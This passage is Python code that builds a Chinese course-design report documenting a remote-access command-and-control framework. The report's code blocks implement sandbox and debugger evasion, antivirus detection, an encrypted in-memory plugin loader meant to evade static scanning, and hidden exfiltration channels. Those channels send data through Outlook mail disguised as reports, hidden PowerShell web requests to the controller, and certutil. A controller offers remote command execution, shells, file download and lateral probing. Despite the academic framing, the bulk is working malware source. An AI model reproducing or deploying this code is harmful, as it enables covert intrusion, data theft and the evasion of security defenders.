        "位置完全不变则判定为无人操作）、键盘状态扫描（GetAsyncKeyState 遍历 VK 8~255，"
        "无任何按键按下则可疑）、系统运行时间检测（GetTickCount64，"
        "沙箱通常在启动后数秒内即开始分析，运行时间少于 10 分钟则可疑）：")
    add_code_block(doc, """\
class CURSORINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.wintypes.DWORD), ("flags", ctypes.wintypes.DWORD),
                ("ptScreenPos", ctypes.wintypes.POINT), ("hCursor", ctypes.wintypes.HANDLE)]

def check_mouse_movement(self):
    # 权重 1: GetCursorInfo 三次采样，间隔 0.3 秒
    # 沙箱无鼠标操作时三点坐标完全相同 -> len(set)==1 判定为沙箱
    positions = []
    for _ in range(3):
        ci = CURSORINFO()
        ci.cbSize = ctypes.sizeof(CURSORINFO)
        user32.GetCursorInfo(ctypes.byref(ci))
        positions.append((ci.ptScreenPos.x, ci.ptScreenPos.y))
        time.sleep(0.3)
    return len(set(positions)) == 1

def check_keyboard_activity(self):
    # 权重 1: GetAsyncKeyState 遍历虚拟键码 VK 8~255
    # 实时查询每个键的按下状态，无任何键按下则可疑
    key_count = 0
    for vk in range(8, 256):
        if user32.GetAsyncKeyState(vk) & 0x8000:
            key_count += 1
    return key_count == 0

def check_uptime(self):
    # 权重 1: GetTickCount64 返回系统启动后的毫秒数
    # 沙箱启动后立即分析，运行时间 < 10 分钟则可疑
    tick = kernel32.GetTickCount64()
    return tick < 10 * 60 * 1000""")

    # ── 6.2.5 加权综合评估算法 ──
    doc.add_heading("6.2.5 加权综合评估与决策算法", level=3)
    add_body(doc,
        "run_all_checks() 方法按固定顺序执行全部 11 项检测，"
        "每项检测结果（布尔值）乘以对应权重后累加到 risk_score。"
        "最终风险比 risk_ratio = risk_score / max_score(19)，"
        "根据两个阈值（0.5 和 0.25）分为三档决策。"
        "这种\"多指标加权 + 阈值分档\"的设计比单一指标判断更稳健，"
        "能有效降低因个别指标误报导致的整体误判：")
    add_code_block(doc, """\
def run_all_checks(self):
    self.risk_score = 0
    self.max_score = 0
    # 按检测类别分组执行，调试器检测权重最高（3），行为检测最低（1）
    checks_config = [
        ("is_debugger_present", self.check_debugger_present(), 3),   # API 直接检测
        ("remote_debugger",     self.check_remote_debugger(),  3),   # 远程调试器
        ("debugger_processes",  self.check_debugger_processes(), 2), # 进程扫描
        ("vm_registry",         self.check_vm_registry(),       2),  # 注册表特征
        ("vm_processes",        self.check_vm_processes(),      2),  # VM 进程
        ("vm_mac",              self.check_vm_mac(),             2),  # MAC 前缀
        ("short_uptime",        self.check_uptime(),             1),  # 运行时间
        ("no_mouse_movement",   self.check_mouse_movement(),    1),  # 鼠标行为
        ("no_keyboard",         self.check_keyboard_activity(),  1), # 键盘行为
        ("low_disk",            self.check_vm_disk_size(),       1),  # 磁盘容量
        ("no_desktop",          self.check_desktop_processes(),  1),  # 桌面进程
    ]
    for name, detected, weight in checks_config:
        self.max_score += weight
        if detected:
            self.risk_score += weight
    # 三档决策阈值
    ratio = self.risk_score / max(self.max_score, 1)     # max_score = 19
    if ratio >= 0.5:
        level = "sandbox"      # 高风险: 伪装退出，不产生异常日志
    elif ratio >= 0.25:
        level = "suspicious"   # 可疑: 降低行为频率，减少通信间隔
    else:
        level = "safe"         # 正常: 继续全功能执行
    return {"risk_score": self.risk_score, "risk_ratio": round(ratio, 2),
            "level": level, "checks": self.checks}""")

    # ══════════════════════════════════════════════════════════════
    # 6.3  WMI 环境深度感知
    # ══════════════════════════════════════════════════════════════
    doc.add_heading("6.3 WMI 系统环境深度感知（agent/env_perception.py）", level=2)
    add_body(doc,
        "环境感知模块负责在沙箱检测通过后，全面采集目标主机的系统信息、"
        "进程列表、安全软件和白名单应用，生成 EnvProfile 环境画像。"
        "该画像为后续通信策略选择提供决策依据——检测到 Outlook 则启用邮件通道，"
        "检测到 Defender 则降低行为频率，检测到微信/钉钉则可用于社工场景。"
        "模块采用 WMI + subprocess 双模式，优先使用 wmi Python 库，"
        "不可用时自动降级到 wmic 命令行，兼容不同 Windows 版本：")

    doc.add_heading("6.3.1 系统基础信息采集", level=3)
    add_body(doc,
        "通过 platform 模块采集主机名、OS 版本、CPU 架构，"
        "通过 ctypes 调用 IsUserAnAdmin 检测管理员权限，"
        "通过 GlobalMemoryStatusEx API 获取物理内存总量，"
        "通过 shutil.disk_usage 获取磁盘可用空间。"
        "全程不依赖第三方库（psutil 仅作为可选加速）：")
    add_code_block(doc, """\
class EnvProfile:
    hostname: str; os_version: str; arch: str
    memory_mb: int; disk_free_gb: float; is_admin: bool
    security_software: List[str]    # 检测到的安全软件
    whitelist_software: List[str]   # 检测到的白名单应用

def collect_system_info(self):
    self.profile.hostname = platform.node()
    self.profile.os_version = platform.platform()
    self.profile.arch = platform.machine()
    # 管理员权限: shell32.IsUserAnAdmin() 返回非零则为管理员
    self.profile.is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
    # 内存: GlobalMemoryStatusEx 填充 MEMORYSTATUSEX 结构体
    class MEMORYSTATUSEX(ctypes.Structure):
        _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                    ("ullTotalPhys", ctypes.c_ulonglong), ...]
    mem = MEMORYSTATUSEX()
    mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
    self.profile.memory_mb = mem.ullTotalPhys // (1024 * 1024)
    # 磁盘: shutil.disk_usage 获取 C 盘可用空间
    _, _, free = shutil.disk_usage("C:\\\\")
    self.profile.disk_free_gb = round(free / (1024 ** 3), 1)""")

    doc.add_heading("6.3.2 进程扫描与软件识别", level=3)
    add_body(doc,
        "通过 tasklist /FO CSV 获取全量进程列表，"
        "然后分别与安全软件特征库和白名单软件特征库进行匹配。"
        "安全软件库覆盖 8 款主流杀软（火绒/360/Defender/卡巴斯基等），"
        "白名单库覆盖 11 类常用办公/通讯软件（Outlook/Word/微信/钉钉等）。"
        "识别结果直接影响通信策略——例如检测到 Outlook 进程则启用 COM 邮件外传通道：")
    add_code_block(doc, """\
# 安全软件特征库: {软件名: [进程名列表]}
SECURITY_SOFTWARE = {
    "火绒": ["HipsTray.exe", "HipsMain.exe", "HipsDaemon.exe"],
    "360":  ["360tray.exe", "360sd.exe", "ZhuDongFangYu.exe"],
    "Windows Defender": ["MsMpEng.exe", "NisSrv.exe"],
    "卡巴斯基": ["avp.exe"], "Norton": ["NortonSecurity.exe"], ...
}
# 白名单软件特征库
WHITELIST_SOFTWARE = {
    "Outlook": ["OUTLOOK.EXE", "olk.exe"],
    "Word": ["WINWORD.EXE"], "微信": ["WeChat.exe"],
    "钉钉": ["DingTalk.exe"], "Chrome": ["chrome.exe"], ...
}

def collect_processes(self):
    # 1. tasklist 获取全量进程名（小写集合用于 O(1) 查找）
    output = subprocess.check_output("tasklist /FO CSV /NH", shell=True, timeout=10)
    proc_names = [line.split('","')[0].strip('"') for line in output.strip().split("\\n")]
    proc_lower = {p.lower() for p in proc_names}
    # 2. 遍历特征库匹配安全软件
    for name, procs in SECURITY_SOFTWARE.items():
        if any(p.lower() in proc_lower for p in procs):
            self.profile.security_software.append(name)
    # 3. 遍历特征库匹配白名单应用
    for name, procs in WHITELIST_SOFTWARE.items():
        if any(p.lower() in proc_lower for p in procs):
            self.profile.whitelist_software.append(name)""")

    doc.add_heading("6.3.3 通信策略决策", level=3)
    add_body(doc,
        "EnvProfile 提供 has_outlook()、has_defender() 等便捷方法，"
        "ChannelManager 据此动态选择通信通道。"
        "例如 has_outlook() 为 True 时启用 Outlook COM 邮件外传通道（隐蔽性最高），"
        "has_defender() 为 True 时降低通信频率和行为幅度，"
        "避免触发 Defender 的行为监控规则。")

    # ══════════════════════════════════════════════════════════════
    # 6.4  sys.meta_path 动态模块加载
    # ══════════════════════════════════════════════════════════════
    doc.add_heading("6.4 自定义 sys.meta_path 动态模块加载（agent/module_loader.py）", level=2)
    add_body(doc,
        "本模块劫持 Python 的 import 机制，实现\"无文件式\"功能扩展。"
        "核心思路：将插件 .py 源码编译为 .pyc 字节码，再用 AES-256-GCM 加密为 .enc 文件；"
        "运行时通过自定义 EncryptedModuleFinder 注入 sys.meta_path，"
        "拦截特定前缀（如 plugins.xxx）的 import 请求，"
        "在内存中解密并执行字节码，全程不落地到磁盘，规避杀软静态扫描。")

    doc.add_heading("6.4.1 插件打包加密（pack_plugin.py）", level=3)
    add_body(doc,
        "打包工具将 .py 源码经过 编译->加密 两步处理："
        "第一步用 py_compile.compile() 编译为 .pyc 字节码（含 magic number + timestamp + code object），"
        "第二步用 AES-256-GCM 加密 .pyc 数据，"
        "密文格式为 [4字节nonce长度][nonce][4字节tag长度][tag][密文]，"
        "写入 .enc 文件。同时生成加密的插件清单 __enc_manifest__ 用于动态发现：")
    add_code_block(doc, """\
def compile_to_pyc(py_path: str) -> bytes:
    # py_compile.compile: .py -> 临时 .pyc 文件 -> 读取字节码 -> 删除临时文件
    with tempfile.NamedTemporaryFile(suffix=".pyc", delete=False) as tmp:
        tmp_path = tmp.name
    py_compile.compile(py_path, cfile=tmp_path, doraise=True)
    pyc_data = open(tmp_path, "rb").read()
    os.remove(tmp_path)
    return pyc_data

def encrypt_plugin(pyc_data: bytes, crypto: CryptoEngine) -> bytes:
    # AES-256-GCM 加密 .pyc 字节码
    nonce, ciphertext, tag = crypto.aes_encrypt(pyc_data)
    # 自定义二进制格式: [nonce_len(4B)][nonce][tag_len(4B)][tag][ciphertext]
    return (struct.pack("!I", len(nonce)) + nonce +
            struct.pack("!I", len(tag)) + tag + ciphertext)

def build_manifest(plugin_dir, plugin_names, crypto):
    # 生成加密清单: {"plugins": {"recon": {"version":"1.0"}, ...}}
    manifest_json = json.dumps({"plugins": {n: {"version":"1.0"} for n in plugin_names}})
    enc_manifest = encrypt_plugin(manifest_json.encode(), crypto)
    with open(os.path.join(plugin_dir, "__enc_manifest__"), "wb") as f:
        f.write(enc_manifest)""")

    doc.add_heading("6.4.2 MetaPathFinder 动态加载器", level=3)
    add_body(doc,
        "EncryptedModuleFinder 继承 importlib.abc.MetaPathFinder，"
        "插入 sys.meta_path 后拦截所有以指定前缀（默认 \"plugins.\"）开头的 import 请求。"
        "find_module() 检查加密文件是否存在，load_module() 执行完整的解密-加载流程："
        "读取 .enc -> 解析 nonce/tag/ciphertext -> AES-GCM 解密 -> "
        "跳过 16 字节 .pyc 头 -> marshal.loads 反序列化代码对象 -> exec 内存执行。"
        "模块在 exec 前先注册到 sys.modules，支持模块自引用：")
    add_code_block(doc, """\
class EncryptedModuleFinder(importlib.abc.MetaPathFinder):
    def __init__(self, plugin_dir, crypto_engine, prefix="plugins."):
        self.plugin_dir = plugin_dir
        self.crypto_engine = crypto_engine
        self.prefix = prefix

    def find_module(self, fullname, path=None):
        # 拦截前缀匹配的 import: "plugins.recon" -> 匹配 "plugins." 前缀
        if fullname.startswith(self.prefix):
            module_key = fullname[len(self.prefix):]
            enc_path = os.path.join(self.plugin_dir, f"{module_key}.enc")
            if os.path.exists(enc_path):
                return self    # 返回自身作为 loader
        return None

    def load_module(self, fullname):
        if fullname in sys.modules:
            return sys.modules[fullname]
        module_key = fullname[len(self.prefix):]
        enc_path = os.path.join(self.plugin_dir, f"{module_key}.enc")
        # 读取加密文件 -> 解析二进制格式 -> AES-GCM 解密
        data = open(enc_path, "rb").read()
        nonce_len = struct.unpack_from("!I", data, 0)[0]
        nonce = data[4:4+nonce_len]
        tag_len = struct.unpack_from("!I", data, 4+nonce_len)[0]
        tag = data[8+nonce_len:8+nonce_len+tag_len]
        ciphertext = data[8+nonce_len+tag_len:]
        pyc_data = self.crypto_engine.aes_decrypt(nonce, ciphertext, tag)
        # 跳过 .pyc 头部 16 字节，反序列化代码对象
        code = marshal.loads(pyc_data[16:])
        # 创建模块 -> 注册到 sys.modules -> exec 内存执行
        module = types.ModuleType(fullname)
        module.__file__ = f"<encrypted:{module_key}>"
        sys.modules[fullname] = module      # 先注册，支持自引用
        exec(code, module.__dict__)          # 内存中执行，无磁盘落地
        return module

def install_finder(plugin_dir, crypto_engine, prefix="plugins."):
    # 注入 sys.meta_path: 移除旧的同类型 finder，插入新的到最前面
    finder = EncryptedModuleFinder(plugin_dir, crypto_engine, prefix)
    sys.meta_path = [f for f in sys.meta_path if not isinstance(f, EncryptedModuleFinder)]
    sys.meta_path.insert(0, finder)
    return finder
# 使用: install_finder("./plugins", crypto) 后即可 from plugins import recon""")

    # ══════════════════════════════════════════════════════════════
    # 6.5  AES+RSA 混合加密通信系统
    # ══════════════════════════════════════════════════════════════
    doc.add_heading("6.5 AES+RSA 混合加密通信系统（shared/crypto.py）", level=2)
    add_body(doc,
        "加密通信是 C2 框架的安全基石。本系统采用 RSA-2048 + AES-256-GCM 混合加密方案："
        "RSA 负责密钥交换（无需预共享密钥），AES-GCM 负责业务数据加密（速度快、自带认证）。"
        "每条消息独立生成随机 nonce，RSA-OAEP 填充防止选择密文攻击，"
        "消息携带时间戳防止重放攻击。所有通信内容（指令传输、数据回传）全程加密，"
        "密钥动态生成，即使流量被嗅探也无法还原明文。")

    doc.add_heading("6.5.1 RSA 密钥管理与交换", level=3)
    add_body(doc,
        "连接建立后，双方首先交换 RSA 公钥（明文传输 PEM 格式），"
        "各自保存对方公钥用于加密会话密钥。每次通信会话生成独立的 AES-256 随机会话密钥，"
        "用对方的 RSA 公钥加密后随消息一起发送。接收方用自己的 RSA 私钥解密出会话密钥，"
        "再用该密钥解密 AES-GCM 密文。整个密钥交换过程在 TCP 连接建立后自动完成：")
    add_code_block(doc, """\
class CryptoEngine:
    def __init__(self):
        self.rsa_key = None             # 本方 RSA 私钥
        self.peer_public_key = None     # 对方 RSA 公钥
        self.session_key = None         # AES-256 会话密钥 (32 字节)
        self._seq = 0                   # 消息序列号

    def generate_rsa_keypair(self, bits=2048):
        # 生成 RSA-2048 密钥对 (约 250 万位素数搜索)
        self.rsa_key = RSA.generate(bits)
        return self.rsa_key

    def get_public_key_pem(self) -> bytes:
        # 导出公钥 PEM 格式，用于发送给对方
        return self.rsa_key.publickey().export_key()

    def load_rsa_public(self, key_data: bytes):
        # 加载对方公钥，后续用于加密会话密钥
        self.peer_public_key = RSA.import_key(key_data)

    def encrypt_session_key(self) -> bytes:
        # 用对方 RSA 公钥 + OAEP 填充加密 AES 会话密钥
        cipher = PKCS1_OAEP.new(self.peer_public_key)
        return cipher.encrypt(self.session_key)

    def decrypt_session_key(self, encrypted_key: bytes) -> bytes:
        # 用本方 RSA 私钥解密 AES 会话密钥
        cipher = PKCS1_OAEP.new(self.rsa_key)
        self.session_key = cipher.decrypt(encrypted_key)
        return self.session_key""")

    doc.add_heading("6.5.2 AES-256-GCM 加解密", level=3)
    add_body(doc,
        "AES-GCM 模式同时提供加密和认证：加密保证数据机密性，"
        "GCM 的认证标签（128-bit tag）保证数据完整性，任何篡改都会导致验证失败。"
        "每次加密自动生成 96-bit 随机 nonce，确保即使相同明文也会产生不同密文：")
    add_code_block(doc, """\
def aes_encrypt(self, plaintext: bytes, key=None):
    # AES-256-GCM: 每次生成随机 96-bit nonce，返回 (nonce, 密文, 认证标签)
    k = key or self.session_key
    cipher = AES.new(k, AES.MODE_GCM)           # 自动生成随机 nonce
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return cipher.nonce, ciphertext, tag          # tag 用于完整性校验

def aes_decrypt(self, nonce, ciphertext, tag, key=None):
    # decrypt_and_verify: 解密 + 验证 tag，篡改则抛异常
    k = key or self.session_key
    cipher = AES.new(k, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)""")

    doc.add_heading("6.5.3 消息加解密与防重放", level=3)
    add_body(doc,
        "encrypt_message() 构建完整的加密消息结构：header 包含会话 ID、序列号、"
        "时间戳、通道类型；encrypted_key 是 RSA 加密的会话密钥；"
        "nonce/payload/tag 是 AES-GCM 加密的业务数据。"
        "decrypt_message() 解密前先验证时间戳（默认 5 分钟过期），"
        "防止重放攻击。消息序列号用于检测丢包和乱序：")
    add_code_block(doc, """\
def encrypt_message(self, plaintext, session_id, channel, msg_type):
    # 生成会话密钥 -> AES-GCM 加密 -> RSA 加密会话密钥 -> 组装消息
    if self.session_key is None:
        self.generate_session_key()             # 首次使用时生成
    nonce, ciphertext, tag = self.aes_encrypt(plaintext)
    enc_key = self.encrypt_session_key()        # RSA 加密会话密钥
    self._seq += 1
    header = {"session_id": session_id, "seq": self._seq,
              "timestamp": time.time(), "channel": channel, "type": msg_type}
    return {"header": header, "encrypted_key": enc_key,
            "nonce": nonce, "payload": ciphertext, "tag": tag}

def decrypt_message(self, message, max_age=300.0):
    # 验证时间戳防重放 (默认 5 分钟过期)
    age = abs(time.time() - message["header"]["timestamp"])
    if age > max_age:
        raise ValueError(f"Message expired ({age:.1f}s > {max_age}s)")
    # RSA 解密会话密钥 -> AES-GCM 解密业务数据
    self.decrypt_session_key(message["encrypted_key"])
    return self.aes_decrypt(message["nonce"], message["payload"], message["tag"])""")

    add_body(doc,
        "传输格式：serialize_message() 将二进制字段 base64 编码后序列化为 JSON，"
        "添加 4 字节大端序长度前缀（struct.pack(\"!I\", length)），"
        "接收端先读 4 字节获取长度，再精确读取对应长度的消息体，"
        "解决 TCP 粘包/拆包问题。")

    doc.add_heading("6.5.4 显式密钥销毁与内存安全", level=3)
    add_body(doc,
        "密钥材料在进程退出后可能通过物理内存残留、Swap/Pagefile、休眠文件等途径泄露。"
        "CryptoEngine 实现 wipe() 方法，在连接断开和对象析构时显式清零密钥："
        "对 session_key 使用全零 bytearray 覆写（Python bytes 不可变，需先创建同长度零缓冲区再赋值覆盖原引用），"
        "对 RSA 密钥对象置空内部 _key 大整数引用后释放。"
        "同时实现 __del__ 析构函数，确保对象被 GC 回收时自动调用 wipe()。")
    add_code_block(doc, """\
def wipe(self):
    # 显式清零内存中的密钥材料
    if self.session_key is not None:
        key_len = len(self.session_key)
        zero_buf = bytearray(key_len)       # 全零 bytearray（mutable）
        self.session_key = bytes(zero_buf)   # 覆写原密钥引用
        self.session_key = None              # 释放引用
    if self.rsa_key is not None:
        self.rsa_key._key = None             # 置空 RSA 私钥内部大整数
        self.rsa_key = None
    if self.peer_public_key is not None:
        self.peer_public_key._key = None     # 置空对方公钥内部大整数
        self.peer_public_key = None
    self._seq = 0

def __del__(self):
    self.wipe()                              # 析构时自动清零""")

    add_body(doc,
        "Controller 端在连接断开时和 close_all_sessions() 中调用 wipe() 清零每个 Agent 连接的密钥；"
        "Agent 端 ChannelManager.close_all() 中调用 wipe() 清零通信密钥。"
        "三处调用点覆盖了所有密钥生命周期结束的场景：")
    add_code_block(doc, """\
# controller/comm_server.py - 连接断开时清零
with self._lock:
    if session_id in self._sessions:
        session_info = self._sessions[session_id]
        if session_info.get("crypto"):
            session_info["crypto"].wipe()    # 显式清零密钥材料
        session_info["sock"].close()
        del self._sessions[session_id]

# controller/comm_server.py - 全部关闭时清零
for sid, info in self._sessions.items():
    info["crypto"].wipe()
    info["sock"].close()

# agent/comm_channels.py - 通道关闭时清零
def close_all(self):
    for ch in self.channels.values():
        ch.close()
    self.channels.clear()
    self.crypto.wipe()                       # 清零加密引擎密钥""")

    # ══════════════════════════════════════════════════════════════
    # 6.6  多通路自适应隐蔽外传
    # ══════════════════════════════════════════════════════════════
    doc.add_heading("6.6 本地/内网多通路自适应隐蔽外传（agent/comm_channels.py）", level=2)
    add_body(doc,
        "通信模块是 Agent 与 Controller 之间的数据传输枢纽。"
        "设计目标：当某一通信通路被阻断时，自动降级到下一优先级通道，"
        "保证通信的可靠性和隐蔽性。"
        "所有通道实现统一的 BaseChannel 抽象接口（connect/send/recv/close），"
        "ChannelManager 根据 EnvProfile 环境画像按优先级选择可用通道。")

    doc.add_heading("6.6.1 通道抽象基类与加密集成", level=3)
    add_body(doc,
        "BaseChannel 定义统一的通信接口，内置 _encrypt_and_serialize() 和 "
        "_deserialize_and_decrypt() 方法，所有子通道的收发数据自动经过加密引擎处理。"
        "子通道只需关注通道本身的连接和传输逻辑，无需重复实现加解密：")
    add_code_block(doc, """\
class BaseChannel(ABC):
    def __init__(self, name, crypto_engine, session_id):
        self.name = name; self.crypto = crypto_engine; self.session_id = session_id

    def _encrypt_and_serialize(self, data, msg_type):
        # 统一加密入口: 业务数据 -> CryptoEngine 加密 -> 序列化为字节流
        msg = self.crypto.encrypt_message(data, self.session_id, self.name, msg_type)
        return serialize_message(msg)

    def _deserialize_and_decrypt(self, raw, offset=0):
        # 统一解密入口: 字节流 -> 反序列化 -> CryptoEngine 解密 -> 明文
        msg, _ = deserialize_message(raw, offset)
        if msg["header"].get("type") == "key_exchange":
            return msg["payload"]    # 密钥交换消息不加密
        return self.crypto.decrypt_message(msg)""")

    doc.add_heading("6.6.2 基础通路：TCP/UDP 加密套接字", level=3)
    add_body(doc,
        "TCPChannel 是最可靠的通道，使用标准 socket 编程实现客户端连接。"
        "消息帧格式为 [4字节长度头][加密消息体]，"
        "recv() 方法实现精确接收（_recv_exact），解决 TCP 粘包问题。"
        "UDPChannel 使用分片传输（每片最大 60KB），"
        "分片头包含 [总片数(1B)][片号(1B)]，接收端按片号重组：")
    add_code_block(doc, """\
class TCPChannel(BaseChannel):
    def connect(self, host="0.0.0.0", port=9999):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.sock.connect((host, port))
        self.connected = True

    def send(self, data, msg_type="result"):
        wire = self._encrypt_and_serialize(data, msg_type)  # 加密+序列化
        self.sock.sendall(wire)

    def recv(self):
        length_data = self._recv_exact(4)         # 读取 4 字节长度头
        length = struct.unpack("!I", length_data)[0]
        body = self._recv_exact(length)            # 精确读取消息体
        return self._deserialize_and_decrypt(length_data + body)  # 解密

class UDPChannel(BaseChannel):
    def send(self, data, msg_type="result"):
        wire = self._encrypt_and_serialize(data, msg_type)
        chunk_size = 60000                        # UDP 分片: 最大 60KB/片
        for i in range(0, len(wire), chunk_size):
            chunk = wire[i:i+chunk_size]
            header = struct.pack("!BB", total_chunks, chunk_id)
            self.sock.sendto(header + chunk, self.target)""")

    doc.add_heading("6.6.3 应用层通路：Outlook COM 邮件外传", level=3)
    add_body(doc,
        "当 EnvProfile 检测到 Outlook 进程运行时，启用 OutlookChannel。"
        "该通道通过 win32com.client.Dispatch(\"Outlook.Application\") 创建 COM 对象，"
        "将加密数据 base64 编码后作为邮件正文发送。"
        "接收端从收件箱最新未读邮件中提取数据。"
        "通道隐蔽性最高——邮件流量是企业正常业务流量，通常不被安全设备拦截：")
    add_code_block(doc, """\
class OutlookChannel(BaseChannel):
    def connect(self, target_email=""):
        # 通过 COM 接口连接 Outlook，失败时重启 Outlook 进程重试
        import win32com.client
        self.outlook = win32com.client.Dispatch("Outlook.Application")
        self.target_email = target_email

    def send(self, data, msg_type="exfil"):
        wire = self._encrypt_and_serialize(data, msg_type)    # 加密
        encoded = base64.b64encode(wire).decode("ascii")       # base64 编码
        mail = self.outlook.CreateItem(0)                      # olMailItem
        mail.To = self.target_email
        mail.Subject = f"Report_{int(time.time())}"            # 伪装为报告
        mail.Body = encoded
        mail.Send()                                            # 通过 Outlook 发送

    def recv(self):
        # 从收件箱扫描最新未读邮件，提取 base64 正文解密
        namespace = self.outlook.GetNamespace("MAPI")
        inbox = namespace.GetDefaultFolder(6)                  # olFolderInbox
        for msg in inbox.Items:
            if msg.UnRead:
                wire = base64.b64decode(msg.Body.strip())
                msg.UnRead = False
                return self._deserialize_and_decrypt(wire)""")

    doc.add_heading("6.6.4 白名单通路：PowerShell / Certutil", level=3)
    add_body(doc,
        "PowerShellChannel 利用系统自带的 powershell.exe 建立 HTTP 隐蔽通道。"
        "发送数据时通过 Invoke-WebRequest POST 到控制端 HTTP 服务，"
        "接收时 GET 拉取指令。使用 -WindowStyle Hidden 和 CREATE_NO_WINDOW 标志"
        "（creationflags=0x08000000）隐藏窗口，不创建可见进程。"
        "CertutilChannel 利用 certutil.exe（通常在安全软件白名单中）"
        "进行 base64 编解码，通过共享目录交换数据：")
    add_code_block(doc, """\
class PowerShellChannel(BaseChannel):
    def send(self, data, msg_type="result"):
        wire = self._encrypt_and_serialize(data, msg_type)
        encoded = base64.b64encode(wire).decode("ascii")
        # PowerShell Invoke-WebRequest POST 到控制端 HTTP 服务
        ps_cmd = (f'$data = "{encoded}"; '
                  f'$bytes = [Convert]::FromBase64String($data); '
                  f'Invoke-WebRequest -Uri "http://{host}:{port}/submit" '
                  f'-Method POST -Body $bytes -TimeoutSec 10')
        subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-Command", ps_cmd],
                         creationflags=0x08000000)      # CREATE_NO_WINDOW: 无可见窗口

class CertutilChannel(BaseChannel):
    def send(self, data, msg_type="exfil"):
        wire = self._encrypt_and_serialize(data, msg_type)
        encoded = base64.b64encode(wire).decode("ascii")
        tmp_path = os.path.join(tempfile.gettempdir(), f"up_{int(time.time())}.b64")
        with open(tmp_path, "w") as f: f.write(encoded)
        # certutil -decode: 系统自带工具，通常在杀软白名单中
        subprocess.run(["certutil", "-decode", tmp_path, out_path],
                       creationflags=0x08000000)
        os.remove(tmp_path)                           # 清理临时文件""")

    doc.add_heading("6.6.5 通道自适应管理器", level=3)
    add_body(doc,
        "ChannelManager 是多通路通信的核心调度器。"
        "select_channels() 根据 EnvProfile 环境画像生成优先级排序的通道列表，"
        "connect_best() 按优先级依次尝试连接，返回第一个成功的通道。"
        "当某通道连接失败或通信中断时，自动降级到下一优先级通道，"
        "实现通信通路的自适应容错。整个过程对 Agent 上层逻辑透明：")
    add_code_block(doc, """\
class ChannelManager:
    def select_channels(self, env_profile):
        # 根据环境画像动态选择可用通道（按优先级排序）
        selected = ["tcp"]                       # 1. TCP 始终可用（最可靠）
        if env_profile.has_outlook():
            selected.append("outlook")           # 2. Outlook COM（需检测到进程）
        selected.append("smtp")                  # 3. SMTP/IMAP 通用邮件
        selected.append("powershell")            # 4. PowerShell（系统自带）
        selected.append("udp")                   # 5. UDP 备选
        selected.append("certutil")              # 6. Certutil 最后手段
        return selected

    def connect_best(self, env_profile, **kwargs):
        # 按优先级依次尝试连接，返回第一个成功的通道
        selected = self.select_channels(env_profile)
        for ch_type in selected:
            channel = self.create_channel(ch_type)       # 工厂方法创建通道实例
            if channel.connect(**kwargs):                 # 尝试连接
                self.active_channel = channel
                return channel                            # 成功则返回
        return None                                       # 全部失败""")

    doc.add_heading("6.7 网络侦察插件（agent/plugins/recon.py）", level=2)
    add_body(doc,
        "recon 插件通过 subprocess 调用 ipconfig、arp、netstat 等系统命令，"
        "解析为结构化数据。")
    add_body(doc,
        "_parse_interfaces(raw) 解析 ipconfig /all 输出，支持中英文双语，"
        "提取 IPv4/掩码/网关/MAC/DNS；"
        "_parse_arp(raw) 解析 ARP 表；_parse_netstat(raw) 解析网络连接；"
        "_parse_dns_cache(raw) 解析 DNS 缓存，支持中英文双语。"
        "返回结构化 JSON：{hostname, interfaces, arp_table, dns_cache, connections, summary}。")

    doc.add_heading("6.8 分片传输实现（agent/frag_transfer.py）", level=2)
    add_body(doc,
        "默认分片大小 4KB，每片间隔 0.1 秒发送，规避流量突发检测。"
        "Fragmenter 负责分片，Reassembler 负责重组，"
        "FragmentedSender/FragmentedReceiver 封装完整收发流程。")

    doc.add_heading("6.9 控制端实现（controller/main.py）", level=2)
    add_body(doc, "控制端提供 CLI 交互界面，支持以下命令：")
    add_formatted_table(doc, ["命令", "说明"], [
        ("sessions", "列出已连接 Agent"),
        ("select <id>", "选择活跃会话"),
        ("exec <command>", "远程执行命令"),
        ("shell", "交互式 Shell"),
        ("sysinfo", "获取系统信息"),
        ("download <path>", "从 Agent 下载文件"),
        ("upload <path>", "上传文件到 Agent"),
        ("modules", "列出已加载模块"),
        ("load_mod <name>", "加载插件模块"),
        ("run_mod <name>", "执行已加载模块"),
        ("netprobe [subnet]", "内网横向探测"),
        ("winmon [seconds]", "窗口活动监控"),
    ], col_widths=[5, 9])

    # ═══════════════════════════════════════════════════════════════════════
    # 七、 课程设计总结
    # ═══════════════════════════════════════════════════════════════════════
    add_h1(doc, "七、 课程设计总结")

    doc.add_heading("7.1 技术收获", level=2)
    for i, g in enumerate([
        "加密通信：深入理解了 RSA/AES 混合加密体系的设计原理，掌握了密钥交换、消息认证、防重放攻击等关键技术",
        "Windows 系统编程：通过 ctypes 调用 Windows API 实现沙箱检测、窗口监控等功能，加深了对系统底层接口的理解",
        "网络编程：实现了 TCP/UDP 多通路通信、分片传输、大端序消息帧等网络编程技术",
        "安全对抗：学习了沙箱检测、环境感知、白名单规避等攻防对抗技术的原理与实现",
        "软件工程：采用了模块化设计、策略模式、抽象工厂等设计模式，提高了代码的可维护性和可扩展性",
    ], 1):
        add_list_item(doc, g, ordered=True, number=i)

    doc.add_heading("7.2 设计亮点", level=2)
    for i, h in enumerate([
        '环境自适应：Agent 能够根据运行环境自动调整通信策略，体现了"先侦察后行动"的安全理念',
        "多通路容错：6 种通信通道按优先级自动降级，保证通信的可靠性",
        "插件化架构：插件加密打包、动态加载、内存执行，具有良好的扩展性",
        '加权风险评估：沙箱检测不是简单的"是/否"判断，而是通过加权评分给出风险等级',
    ], 1):
        add_list_item(doc, h, ordered=True, number=i)

    doc.add_heading("7.3 不足与改进", level=2)
    for i, im in enumerate([
        "通信协议：当前使用 JSON 文本协议，效率较低，可改进为 Protocol Buffers 等二进制协议",
        "插件安全：插件在内存中以明文 .pyc 形式存在，可进一步实现代码混淆",
        "持久化：当前 Agent 重启后需重新连接，可增加注册表/计划任务等持久化机制",
        "流量特征：TCP 通信的流量特征较为明显，可增加流量伪装（如 HTTPS 隧道）能力",
    ], 1):
        add_list_item(doc, im, ordered=True, number=i)

